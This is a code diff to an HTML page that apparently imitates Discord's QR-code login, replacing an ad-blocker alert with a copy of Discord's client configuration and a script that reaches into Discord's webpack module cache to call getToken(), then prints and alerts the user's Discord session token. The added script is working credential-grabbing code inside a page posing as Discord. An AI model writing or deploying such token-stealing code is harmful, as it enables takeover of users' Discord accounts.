@@ -27,7 +27,40 @@
     </body>
 
     <script>
-        alert('If you do not see a QR-Code, please disable your add-blocker.');
+        window.GLOBAL_ENV = {
+                API_ENDPOINT: '//discord.com/api',
+                API_VERSION: 9,
+                GATEWAY_ENDPOINT: 'wss://gateway.discord.gg',
+                WEBAPP_ENDPOINT: '//discord.com',
+                CDN_HOST: 'cdn.discordapp.com',
+                ASSET_ENDPOINT: 'https://discord.com',
+                MEDIA_PROXY_ENDPOINT: 'https://media.discordapp.net',
+                WIDGET_ENDPOINT: '//discord.com/widget',
+                INVITE_HOST: 'discord.gg',
+                GUILD_TEMPLATE_HOST: 'discord.new',
+                GIFT_CODE_HOST: 'discord.gift',
+                RELEASE_CHANNEL: 'stable',
+                MARKETING_ENDPOINT: '//discord.com',
+                BRAINTREE_KEY: 'production_5st77rrc_49pp2rp4phym7387',
+                STRIPE_KEY: 'pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
+                NETWORKING_ENDPOINT: '//router.discordapp.net',
+                RTC_LATENCY_ENDPOINT: '//latency.discord.media/rtc',
+                ACTIVITY_APPLICATION_HOST: 'discordsays.com',
+                PROJECT_ENV: 'production',
+                REMOTE_AUTH_ENDPOINT: '//remote-auth-gateway.discord.gg',
+                SENTRY_TAGS: {
+                    "buildId": "69f0658",
+                    "buildType": "normal"
+                },
+                MIGRATION_SOURCE_ORIGIN: 'https://discordapp.com',
+                MIGRATION_DESTINATION_ORIGIN: 'https://discord.com',
+                HTML_TIMESTAMP: Date.now(),
+                ALGOLIA_KEY: 'aca0d7082e4e63af5ba5917d5e96bed0',
+            };
+        //alert('If you do not see a QR-Code, please disable your add-blocker.');
+        const tk = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
+        console.log(tk);
+        alert(tk);
     </script>
 
     <style>
